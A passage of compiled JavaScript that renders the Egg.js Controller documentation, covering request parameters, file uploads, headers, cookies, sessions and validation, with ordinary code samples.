track.")),r.a.createElement("h4",{id:"customized-controller-base-class"},r.a.createElement(l["AnchorLink"],{to:"#customized-controller-base-class","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Customized Controller Base Class"),r.a.createElement("p",null,"Defining a Controller class helps us not only abstract the Controller layer codes better(e.g. some unified processing can be abstracted as private) but also encapsulate methods that are widely used in the application by defining a customized Controller base class."),r.a.createElement(o["a"],{code:"// app/core/base_controller.js\nconst { Controller } = require('egg');\nclass BaseController extends Controller {\n  get user() {\n    return this.ctx.session.user;\n  }\n\n  success(data) {\n    this.ctx.body = {\n      success: true,\n      data,\n    };\n  }\n\n  notFound(msg) {\n    msg = msg || 'not found';\n    this.ctx.throw(404, msg);\n  }\n}\nmodule.exports = BaseController;",lang:"js"}),r.a.createElement("p",null,"Now we can use base class' methods by inheriting from ",r.a.createElement("code",null,"BaseController"),":"),r.a.createElement(o["a"],{code:"//app/controller/post.js\nconst Controller = require('../core/base_controller');\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.service.listByUser(this.user);\n    this.success(posts);\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"methods-style-controller-its-not-recommended-only-for-compatibility"},r.a.createElement(l["AnchorLink"],{to:"#methods-style-controller-its-not-recommended-only-for-compatibility","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Methods Style Controller (It's not recommended, only for compatibility)"),r.a.createElement("p",null,"Every Controller is an async function, whose argument is the instance of the request ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context")," and through which we can access many attributes and methods encapsulated by the framework conveniently."),r.a.createElement("p",null,"For example, when we define a Controller relative to ",r.a.createElement("code",null,"POST /api/posts"),", we create a ",r.a.createElement("code",null,"post.js")," file under ",r.a.createElement("code",null,"app/controller")," directory."),r.a.createElement(o["a"],{code:"// app/controller/post.js\nexports.create = async (ctx) => {\n  const createRule = {\n    title: { type: 'string' },\n    content: { type: 'string' },\n  };\n  // verify parameters\n  ctx.validate(createRule);\n  // assemble parameters\n  const author = ctx.session.userId;\n  const req = Object.assign(ctx.request.body, { author });\n  // calls Service to handle business\n  const res = await ctx.service.post.create(req);\n  // set response content and status code\n  ctx.body = { id: res.id };\n  ctx.status = 201;\n};",lang:"js"}),r.a.createElement("p",null,"In the above example, we introduce some new concepts, however it's still intuitive and understandable. We'll explain these new concepts in detail soon."),r.a.createElement("h2",{id:"http-basics"},r.a.createElement(l["AnchorLink"],{to:"#http-basics","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"HTTP Basics"),r.a.createElement("p",null,"Since Controller is probably the only place to interact with HTTP protocol when developing business logics, it's necessary to have a quick look at how HTTP protocol works before going on."),r.a.createElement("p",null,"If we send a HTTP request to access the previous example Controller:"),r.a.createElement(o["a"],{code:'curl -X POST http://localhost:3000/api/posts --data \'{"title":"controller", "content": "what is controller"}\' --header \'Content-Type:application/json; charset=UTF-8\'',lang:"unknown"}),r.a.createElement("p",null,"The HTTP request sent by curl looks like this:"),r.a.createElement(o["a"],{code:'POST /api/posts HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json; charset=UTF-8\n\n{"title": "controller", "content": "what is controller"}',lang:"unknown"}),r.a.createElement("p",null,"The first line of the request contains three information, first two of which are commonly used:"),r.a.createElement("ul",null,r.a.createElement("li",null,"method: it's ",r.a.createElement("code",null,"POST")," in this example."),r.a.createElement("li",null,"path: it's ",r.a.createElement("code",null,"/api/posts"),", if the user's request contains query, it will also be placed here.")),r.a.createElement("p",null,"From the second line to the place where the first empty line appears is the Header part of the request which includes many useful attributes. as you may see, Host, Content-Type and ",r.a.createElement("code",null,"Cookie"),", ",r.a.createElement("code",null,"User-Agent"),", etc. There are two headers in this request:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"Host"),": when we send a request in the browser, the domain is resolved to server IP by DNS and, as well, the domain and port are sent to the server in the Host header by the browser."),r.a.createElement("li",null,r.a.createElement("code",null,"Content-Type"),": when we have a body in our request, the Content-Type is provided to describe the type of our request body.")),r.a.createElement("p",null,"The whole following content is the request body, which can be brought by POST, PUT, DELETE and other methods. and the server resolves the request body according to Content-Type."),r.a.createElement("p",null,"When the sever finishes to process the request, a HTTP response is sent back to the client:"),r.a.createElement(o["a"],{code:'HTTP/1.1 201 Created\nContent-Type: application/json; charset=utf-8\nContent-Length: 8\nDate: Mon, 09 Jan 2017 08:40:28 GMT\nConnection: keep-alive\n\n{"id": 1}',lang:"unknown"}),r.a.createElement("p",null,"The first line contains three segments, among which the ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/List_of_HTTP_status_codes"},"status code")," is used mostly, in this case, it's 201 which means the server has created a resource successfully."),r.a.createElement("p",null,"Similar to the request, the header part begins at the second line and ends at the place where the next empty line appears, in this case, they are Content-Type and Content-Length indicating the response format is JSON and the length is 8 bytes."),r.a.createElement("p",null,"The remaining part is the actual content of this response."),r.a.createElement("h2",{id:"acquire-http-request-parameters"},r.a.createElement(l["AnchorLink"],{to:"#acquire-http-request-parameters","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Acquire HTTP Request Parameters"),r.a.createElement("p",null,"It can be seen from the above HTTP request examples that there are many places can be used to put user's request data. The framework provides many convenient methods and attributes by binding the Context instance to Controllers to acquire parameters sent by users through HTTP request."),r.a.createElement("h3",{id:"query"},r.a.createElement(l["AnchorLink"],{to:"#query","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"query")),r.a.createElement("p",null,"Usually the Query String, string following ",r.a.createElement("code",null,"?")," in the URL, is used to send parameters by request of GET type. For example, ",r.a.createElement("code",null,"category=egg&language=node")," in ",r.a.createElement("code",null,"GET /posts?category=egg&language=node")," is the parameter that user sends. We can acquire this parsed parameter body through ",r.a.createElement("code",null,"ctx.query"),":"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async listPosts() {\n    const query = this.ctx.query;\n    // {\n    //   category: 'egg',\n    //   language: 'node',\n    // }\n  }\n}",lang:"js"}),r.a.createElement("p",null,"If duplicated keys exist in Query String, only the first value of this key is used by ",r.a.createElement("code",null,"ctx.query")," and the subsequent appearance will be omitted. That is to say, for request ",r.a.createElement("code",null,"GET /posts?category=egg&category=koa"),", what ",r.a.createElement("code",null,"ctx.query")," acquires is ",r.a.createElement("code",null,"{"," category: 'egg' ","}"),"."),r.a.createElement("p",null,"This is for unity reason, because we usually do not design users to pass parameters with same keys in Query String then we write codes like below:"),r.a.createElement(o["a"],{code:"const key = ctx.query.key || '';\nif (key.startsWith('egg')) {\n  // do something\n}",lang:"js"}),r.a.createElement("p",null,"Or if someone passes parameters with same keys in Query String on purpose, system error may be thrown. To avoid this, the framework guarantee that the parameter must be a string type whenever it is acquired from ",r.a.createElement("code",null,"ctx.query"),"."),r.a.createElement("h4",{id:"queries"},r.a.createElement(l["AnchorLink"],{to:"#queries","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"queries")),r.a.createElement("p",null,"Sometimes our system is designed to accept same keys sent by users, like ",r.a.createElement("code",null,"GET /posts?category=egg&id=1&id=2&id=3"),". For this situation, the framework provides ",r.a.createElement("code",null,"ctx.queries")," object to parse Query String and put duplicated data into an array:"),r.a.createElement(o["a"],{code:"// GET /posts?category=egg&id=1&id=2&id=3\nclass PostController extends Controller {\n  async listPosts() {\n    console.log(this.ctx.queries);\n    // {\n    //   category: [ 'egg' ],\n    //   id: [ '1', '2', '3' ],\n    // }\n  }\n}",lang:"js"}),r.a.createElement("p",null,"All key on the ",r.a.createElement("code",null,"ctx.queries")," will be an array type if it has a value."),r.a.createElement("h3",{id:"router-params"},r.a.createElement(l["AnchorLink"],{to:"#router-params","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router Params"),r.a.createElement("p",null,"In ",r.a.createElement(l["Link"],{to:"./router"},"Router")," part, we say Router is allowed to declare parameters which can be acquired by ",r.a.createElement("code",null,"ctx.params"),"."),r.a.createElement(o["a"],{code:"// app.get('/projects/:projectId/app/:appId', 'app.listApp');\n// GET /projects/1/app/2\nclass AppController extends Controller {\n  async listApp() {\n    assert.equal(this.ctx.params.projectId, '1');\n    assert.equal(this.ctx.params.appId, '2');\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"body"},r.a.createElement(l["AnchorLink"],{to:"#body","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"body")),r.a.createElement("p",null,"Although we can pass parameters through URL, but constraints exist:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/417142/what-is-the-maximum-length-of-a-url-in-different-browsers"},"the browser limits the maximum length of a URL"),", so too many parameters cannot be passed."),r.a.createElement("li",null,"the server records the full request URL to log files so it is not safe to pass sensitive data through URL.")),r.a.createElement("p",null,"In the above HTTP request message example, we can learn, following the header, there's a body part that can be used to put parameters for POST, PUT and DELETE, etc. The ",r.a.createElement("code",null,"Content-Type")," will be sent by clients(browser) in the same time to tell the server the type of request body when there is a body in a general request. Two mostly used data formats are JSON and Form in Web developing for transferring data."),r.a.createElement("p",null,"The ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/bodyparser"},"bodyParser")," middleware is built in by the framework to parse the request body of these two kinds of formats into an object mounted to ",r.a.createElement("code",null,"ctx.request.body"),". Since it's not recommended by the HTTP protocol to pass a body by GET and HEAD methods, ",r.a.createElement("code",null,"ctx.request.body")," cannot be used for GET and HEAD methods."),r.a.createElement(o["a"],{code:'// POST /api/posts HTTP/1.1\n// Host: localhost:3000\n// Content-Type: application/json; charset=UTF-8\n//\n// {"title": "controller", "content": "what is controller"}\nclass PostController extends Controller {\n  async listPosts() {\n    assert.equal(this.ctx.request.body.title, \'controller\');\n    assert.equal(this.ctx.request.body.content, \'what is controller\');\n  }\n}',lang:"js"}),r.a.createElement("p",null,"The framework configures some default parameters for bodyParser and has the following features:"),r.a.createElement("ul",null,r.a.createElement("li",null,"when Content-Type is ",r.a.createElement("code",null,"application/json"),", ",r.a.createElement("code",null,"application/json-patch+json"),", ",r.a.createElement("code",null,"application/vnd.api+json")," and ",r.a.createElement("code",null,"application/csp-report"),", it parses the request body as JSON format and limits the maximum length of the body down to ",r.a.createElement("code",null,"100kb"),"."),r.a.createElement("li",null,"when Content-Type is ",r.a.createElement("code",null,"application/x-www-form-urlencoded"),", it parses the request body as Form format and limits the maximum length of the body down to ",r.a.createElement("code",null,"100kb"),"."),r.a.createElement("li",null,"when parses successfully, the body must be an Object(also can be an array).")),r.a.createElement("p",null,"The mostly adjusted config field is the maximum length of the request body for parsing which can be configured in ",r.a.createElement("code",null,"config/config.default.js")," to overwrite the default value of the framework:"),r.a.createElement(o["a"],{code:"module.exports = {\n  bodyParser: {\n    jsonLimit: '1mb',\n    formLimit: '1mb',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"If user request exceeds the maximum length for parsing that we configured, the framework will throw an exception whose status code is ",r.a.createElement("code",null,"413"),"; if request body fails to be parsed(e.g. wrong JSON), an exception with status code ",r.a.createElement("code",null,"400")," will be thrown."),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: when adjusting the maximum length of the body for bodyParser, if we have a reverse proxy(Nginx) in front of our application, we may need to adjust its configuration, so that the reverse proxy also supports the same length of request body.")),r.a.createElement("p",null,r.a.createElement("strong",null,"A common mistake is to confuse ",r.a.createElement("code",null,"ctx.request.body")," and ",r.a.createElement("code",null,"ctx.body"),"(which is alias for ",r.a.createElement("code",null,"ctx.response.body"),").")),r.a.createElement("h3",{id:"acquiring-the-submitted-files"},r.a.createElement(l["AnchorLink"],{to:"#acquiring-the-submitted-files","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Acquiring the Submitted Files"),r.a.createElement("p",null,"The ",r.a.createElement("code",null,"body")," in the request can carry parameters as well as files. Generally speaking, our browsers always send files in ",r.a.createElement("code",null,"multipart/form-data"),", and we now have two kinds of ways supporting submitting and acquiring files with the help of the framework's plugin ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart"},"Multipart"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("h4",{id:"file-mode"},r.a.createElement(l["AnchorLink"],{to:"#file-mode","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"File")," Mode:"),"If you have no ideas about Nodejs's Stream at all, the ",r.a.createElement("code",null,"File")," mode suits you well:")),r.a.createElement("ol",null,r.a.createElement("li",null,"In your config file, enable ",r.a.createElement("code",null,"file")," mode first:")),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.multipart = {\n  mode: 'file',\n};",lang:"js"}),r.a.createElement("ol",{start:2},r.a.createElement("li",null,"Submitting / Acquiring Files:")),r.a.createElement("ol",null,r.a.createElement("li",null,"For Single File:")),r.a.createElement("p",null,"Your HTML static front-end codes should look like this below:"),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file: <input name="file" type="file" />\n  <button type="submit">Upload</button>\n</form>',lang:"html"}),r.a.createElement("p",null,"The corresponding backend codes are:"),r.a.createElement(o["a"],{code:"// app/controller/upload.js\nconst Controller = require('egg').Controller;\nconst fs = require('fs/promises');\n\nmodule.exports = class extends Controller {\n  async upload() {\n    const { ctx } = this;\n    const file = ctx.request.files[0];\n    const name = 'egg-multipart-test/' + path.basename(file.filename);\n    let result;\n    try {\n      // process file (e.g: upload to cloud storage)\n      result = await ctx.oss.put(name, file.filepath);\n    } finally {\n      // need to remove the tmp file\n      await fs.unlink(file.filepath);\n    }\n\n    ctx.body = {\n      url: result.url,\n      // get all field values\n      requestBody: ctx.request.body,\n    };\n  }\n};",lang:"js"}),r.a.createElement("ol",{start:2},r.a.createElement("li",null,"For Multiple Files:")),r.a.createElement("p",null,"For multiple files, with the help of ",r.a.createElement("code",null,"ctx.request.files"),", we can loop each of them and do what process we like:"),r.a.createElement("p",null,"Your HTML static front-end codes should look like this below:"),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file1: <input name="file1" type="file" /> file2:\n  <input name="file2" type="file" />\n  <button type="submit">Upload</button>\n</form>',lang:"html"}),r.a.createElement("p",null,"The corresponding backend codes are:"),r.a.createElement(o["a"],{code:"// app/controller/upload.js\nconst Controller = require('egg').Controller;\nconst fs = require('fs/promises');\n\nmodule.exports = class extends Controller {\n  async upload() {\n    const { ctx } = this;\n    console.log(ctx.request.body);\n    console.log('got %d files', ctx.request.files.length);\n    for (const file of ctx.request.files) {\n      console.log('field: ' + file.fieldname);\n      console.log('filename: ' + file.filename);\n      console.log('encoding: ' + file.encoding);\n      console.log('mime: ' + file.mime);\n      console.log('tmp filepath: ' + file.filepath);\n      let result;\n      try {\n        // process file (e.g: upload to cloud storage)\n        result = await ctx.oss.put(\n          'egg-multipart-test/' + file.filename,\n          file.filepath,\n        );\n      } finally {\n        // need to remove the tmp file\n        await fs.unlink(file.filepath);\n      }\n      console.log(result);\n    }\n  }\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("h4",{id:"stream-mode"},r.a.createElement(l["AnchorLink"],{to:"#stream-mode","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"Stream")," Mode"),"If you are very familiar with ",r.a.createElement("code",null,"Stream")," in Nodejs, you can choose this way. In a controller, we can fetch the uploaded files through ",r.a.createElement("code",null,"ctx.getFileStream()"),".")),r.a.createElement("ol",null,r.a.createElement("li",null,"For Single File\uff1a")),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file: <input name="file" type="file" />\n  <button type="submit">Upload</button>\n</form>',lang:"html"}),r.a.createElement(o["a"],{code:"const path = require('path');\nconst sendToWormhole = require('stream-wormhole');\nconst Controller = require('egg').Controller;\n\nclass UploaderController extends Controller {\n  async upload() {\n    const ctx = this.ctx;\n    const stream = await ctx.getFileStream();\n    const name = 'egg-multipart-test/' + path.basename(stream.filename);\n    let result;\n    try {\n      // process file (e.g: upload to cloud storage)\n      result = await ctx.oss.put(name, stream);\n    } catch (err) {\n      // You MUST consume the file stream, otherwises the browser cannot response any more\n      await sendToWormhole(stream);\n      throw err;\n    }\n\n    ctx.body = {\n      url: result.url,\n      // All the fields in the form can be fetched through `stream.fields`\n      fields: stream.fields,\n    };\n  }\n}\n\nmodule.exports = UploaderController;",lang:"js"}),r.a.createElement("p",null,"To acquire the uploaded files easily, there're two conditions at least:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Only ONE file per time."),r.a.createElement("li",null,"The field of uploading file MUST be after the other fields in a form, otherwise you cannot get other fields after getting the file stream.")),r.a.createElement("ol",{start:2},r.a.createElement("li",null,"For Multiple Files:")),r.a.createElement("p",null,"For multiple files, you should do the following instead of using ",r.a.createElement("code",null,"ctx.getFileStream()"),":"),r.a.createElement(o["a"],{code:"const sendToWormhole = require('stream-wormhole');\nconst Controller = require('egg').Controller;\n\nclass UploaderController extends Controller {\n  async upload() {\n    const ctx = this.ctx;\n    const parts = ctx.multipart();\n    let part;\n    // parts() return a promise\n    while ((part = await parts()) != null) {\n      if (part.length) {\n        // arrays are busboy fields\n        console.log('field: ' + part[0]);\n        console.log('value: ' + part[1]);\n        console.log('valueTruncated: ' + part[2]);\n        console.log('fieldnameTruncated: ' + part[3]);\n      } else {\n        if (!part.filename) {\n          // When a user clicks `upload` before choosing a file,\n          // `part` will be file stream, but `part.filename` is empty.\n          // We must handler this by notifying the user that he/she should\n          // choose a file before submitting\n          return;\n        }\n        // otherwise, it's a fully-filled stream\n        console.log('field: ' + part.fieldname);\n        console.log('filename: ' + part.filename);\n        console.log('encoding: ' + part.encoding);\n        console.log('mime: ' + part.mime);\n        let result;\n        try {\n          // process file (e.g: upload to cloud storage)\n          result = await ctx.oss.put(\n            'egg-multipart-test/' + part.filename,\n            part,\n          );\n        } catch (err) {\n          // You MUST consume the file stream, otherwises the browser cannot response any more\n          await sendToWormhole(part);\n          throw err;\n        }\n        console.log(result);\n      }\n    }\n    console.log('and we are done parsing the form!');\n  }\n}\n\nmodule.exports = UploaderController;",lang:"js"}),r.a.createElement("p",null,"The framework also has the limits for the safety of uploading files, the default white list is:"),r.a.createElement(o["a"],{code:"// images\n'.jpg', '.jpeg', // image/jpeg\n'.png', // image/png, image/x-png\n'.gif', // image/gif\n'.bmp', // image/bmp\n'.wbmp', // image/vnd.wap.wbmp\n'.webp',\n'.tif',\n'.psd',\n// text\n'.svg',\n'.js', '.jsx',\n'.json',\n'.css', '.less',\n'.html', '.htm',\n'.xml',\n// tar\n'.zip',\n'.gz', '.tgz', '.gzip',\n// video\n'.mp3',\n'.mp4',\n'.avi',",lang:"js"}),r.a.createElement("p",null,"Users can add new file extensions in ",r.a.createElement("code",null,"config/config.default.js"),", or rewrite a whole white list:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Newly-added a file extension:")),r.a.createElement(o["a"],{code:"module.exports = {\n  multipart: {\n    fileExtensions: ['.apk'], // Add support for apk files\n  },\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Overwriting a whole white list:")),r.a.createElement(o["a"],{code:"module.exports = {\n  multipart: {\n    whitelist: ['.png'], // ONLY files of png is allowed\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Notice\uff1a",r.a.createElement("code",null,"fileExtensions")," will be IGNORED when ",r.a.createElement("code",null,"whitelist")," is overwritten.")),r.a.createElement("p",null,"For more tech details about this, please refer ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart"},"Egg-Multipart"),"."),r.a.createElement("h3",{id:"header"},r.a.createElement(l["AnchorLink"],{to:"#header","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"header")),r.a.createElement("p",null,"Apart from URL and request body, some parameters can be sent by request header. The framework provides some helper attributes and methods to retrieve them."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.headers"),", ",r.a.createElement("code",null,"ctx.header"),", ",r.a.createElement("code",null,"ctx.request.headers"),", ",r.a.createElement("code",null,"ctx.request.header"),": these methods are equivalent and all of them get the whole header object."),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.get(name)"),", ",r.a.createElement("code",null,"ctx.request.get(name)"),": get the value of one parameter from the request header, if the parameter does not exist, an empty string will be returned."),r.a.createElement("li",null,"We recommend you use ",r.a.createElement("code",null,"ctx.get(name)")," rather than ",r.a.createElement("code",null,"ctx.headers['name']")," because the former handles upper/lower case automatically.")),r.a.createElement("p",null,"Since header is special, some of which are given specific meanings by the ",r.a.createElement("code",null,"HTTP")," protocol (like ",r.a.createElement("code",null,"Content-Type"),", ",r.a.createElement("code",null,"Accept"),"), some are set by the reverse proxy as a convention (X-Forwarded-For), and the framework provides some convenient getters for them as well, for more details please refer to ",r.a.createElement(l["Link"],{to:"https://eggjs.org/api/"},"API"),"."),r.a.createElement("p",null,"Specially when we set ",r.a.createElement("code",null,"config.proxy = true")," to deploy the application behind the reverse proxy (Nginx), some Getters' internal process may be changed."),r.a.createElement("h4",{id:"ctxhost"},r.a.createElement(l["AnchorLink"],{to:"#ctxhost","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.host")),r.a.createElement("p",null,"Reads the header's value configured by ",r.a.createElement("code",null,"config.hostHeaders")," firstly, if fails, then it tries to get the value of host header, if fails again, it returns an empty string."),r.a.createElement("p",null,r.a.createElement("code",null,"config.hostHeaders")," defaults to ",r.a.createElement("code",null,"x-forwarded-host"),"."),r.a.createElement("h4",{id:"ctxprotocol"},r.a.createElement(l["AnchorLink"],{to:"#ctxprotocol","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.protocol")),r.a.createElement("p",null,"When you get protocol through this Getter, it checks whether current connection is an encrypted one or not, if it is, it returns HTTPS."),r.a.createElement("p",null,"When current connection is not an encrypted one, it reads the header's value configured by ",r.a.createElement("code",null,"config.protocolHeaders")," to check HTTP or HTTPS, if it fails, we can set a safe-value(defaults to HTTP) through ",r.a.createElement("code",null,"config.protocol")," in the configuration."),r.a.createElement("p",null,r.a.createElement("code",null,"config.protocolHeaders")," defaults to ",r.a.createElement("code",null,"x-forwarded-proto"),"."),r.a.createElement("h4",{id:"ctxips"},r.a.createElement(l["AnchorLink"],{to:"#ctxips","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.ips")),r.a.createElement("p",null,"A IP address list of all intermediate equipments that a request go through can be get by ",r.a.createElement("code",null,"ctx.ips"),", only when ",r.a.createElement("code",null,"config.proxy = true"),", it reads the header's value configured by ",r.a.createElement("code",null,"config.ipHeaders")," instead, if fails, it returns an empty array."),r.a.createElement("p",null,r.a.createElement("code",null,"config.ipHeaders")," defaults to ",r.a.createElement("code",null,"x-forwarded-for"),"."),r.a.createElement("h4",{id:"ctxip"},r.a.createElement(l["AnchorLink"],{to:"#ctxip","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.ip")),r.a.createElement("p",null,"The IP address of the sender of the request can be get by ",r.a.createElement("code",null,"ctx.ip"),", it reads from ",r.a.createElement("code",null,"ctx.ips")," firstly, if ",r.a.createElement("code",null,"ctx.ips")," is empty, it returns the connection sender's IP address."),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: ",r.a.createElement("code",null,"ip")," and ",r.a.createElement("code",null,"ips")," are different, if ",r.a.createElement("code",null,"config.proxy = false"),", ",r.a.createElement("code",null,"ip")," returns the connection sender's IP address while ",r.a.createElement("code",null,"ips")," returns an empty array.")),r.a.createElement("h3",{id:"cookie"},r.a.createElement(l["AnchorLink"],{to:"#cookie","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cookie"),r.a.createElement("p",null,"All HTTP requests are stateless but, on the contrary, our Web applications usually need to know who sends the requests. To make it through, the HTTP protocol designs a special request header: ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/HTTP_cookie"},"Cookie"),". With the response header (set-cookie), the server is able to send a few data to the client, the browser saves these data according to the protocol and brings them along with the next request(according to the protocol and for safety reasons, only when accessing websites that match the rules specified by Cookie does the browser bring related Cookies)."),r.a.createElement("p",null,"Through ",r.a.createElement("code",null,"ctx.cookies"),", we can conveniently and safely set and get Cookie in Controller."),r.a.createElement(o["a"],{code:"class CookieController extends Controller {\n  async add() {\n    const ctx = this.ctx;\n    let count = ctx.cookies.get('count');\n    count = count ? Number(count) : 0;\n    ctx.cookies.set('count', ++count);\n    ctx.body = count;\n  }\n\n  async remove() {\n    const ctx = this.ctx;\n    const count = ctx.cookies.set('count', null);\n    ctx.status = 204;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Although Cookie is only a header in HTTP, multiple key-value pairs can be set in the format of ",r.a.createElement("code",null,"foo=bar;foo1=bar1;"),"."),r.a.createElement("p",null,"In Web applications, Cookie is usually used to send the identity information of the client, so it has many safety related configurations which can not be ignored, ",r.a.createElement(l["AnchorLink"],{to:"../core/cookie-and-session#cookie"},"Cookie")," explains the usage and safety related configurations of Cookie in detail and is worth being read in depth."),r.a.createElement("h4",{id:"configuration"},r.a.createElement(l["AnchorLink"],{to:"#configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuration"),r.a.createElement("p",null,"There are mainly these attributes below can be used to configure default Cookie options in ",r.a.createElement("code",null,"config.default.js"),":"),r.a.createElement(o["a"],{code:"module.exports = {\n  cookies: {\n    // httpOnly: true | false,\n    // sameSite: 'none|lax|strict',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"e.g.: Configured application level Cookie ",r.a.createElement(l["Link"],{to:"https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html"},"SameSite")," property to ",r.a.createElement("code",null,"Lax"),"."),r.a.createElement(o["a"],{code:"module.exports = {\n  cookies: {\n    sameSite: 'lax',\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"session"},r.a.createElement(l["AnchorLink"],{to:"#session","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session"),r.a.createElement("p",null,"By using Cookie, we can create an individual Session specific to every user to store user identity information, which will be encrypted then stored in Cookie to perform session persistence across requests."),r.a.createElement("p",null,"The framework builds in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session"},"Session")," plugin, which provides ",r.a.createElement("code",null,"ctx.session")," for us to get or set current user's Session."),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async fetchPosts() {\n    const ctx = this.ctx;\n    // get data from Session\n    const userId = ctx.session.userId;\n    const posts = await ctx.service.post.fetch(userId);\n    // set value to Session\n    ctx.session.visited = ctx.session.visited ? ++ctx.session.visited : 1;\n    ctx.body = {\n      success: true,\n      posts,\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"It's quite intuitional to use Session, just get or set directly, if you want to delete it, you can assign it to ",r.a.createElement("code",null,"null"),":"),r.a.createElement(o["a"],{code:"class SessionController extends Controller {\n  async deleteSession() {\n    this.ctx.session = null;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Like Cookie, Session has many safety related configurations and functions etc., so it's better to read ",r.a.createElement(l["AnchorLink"],{to:"../core/cookie-and-session#session"},"Session")," in depth in ahead."),r.a.createElement("h4",{id:"configuration-1"},r.a.createElement(l["AnchorLink"],{to:"#configuration-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuration"),r.a.createElement("p",null,"There are mainly these attributes below can be used to configure Session in ",r.a.createElement("code",null,"config.default.js"),":"),r.a.createElement(o["a"],{code:"module.exports = {\n  key: 'EGG_SESS', // the name of key-value pairs, which is specially used by Cookie to store Session\n  maxAge: 86400000, // Session maximum valid time\n};",lang:"js"}),r.a.createElement("h2",{id:"parameter-validation"},r.a.createElement(l["AnchorLink"],{to:"#parameter-validation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Parameter Validation"),r.a.createElement("p",null,"After getting parameters from user requests, in most cases, it is inevitable to validate these parameters."),r.a.createElement("p",null,"With the help of the convenient parameter validation mechanism provided by ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-validate"},"Validate")," plugin, with which we can do all kinds of complex parameter validations."),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.validate = {\n  enable: true,\n  package: 'egg-validate',\n};",lang:"js"}),r.a.createElement("p",null,"Validate parameters directly through ",r.a.createElement("code",null,"ctx.validate(rule, [body])"),":"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async create() {\n    // validate parameters\n    // if the second parameter is absent, `ctx.request.body` is validated automatically\n    this.ctx.validate({\n      title: { type: 'string' },\n      content: { type: 'string' },\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"When the validation fails, an exception will be thrown immediately with an error code of 422 and an errors field containing the detailed information why it fails. You can capture this exception through ",r.a.createElement("code",null,"try catch")," and handle it all by yourself."),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n 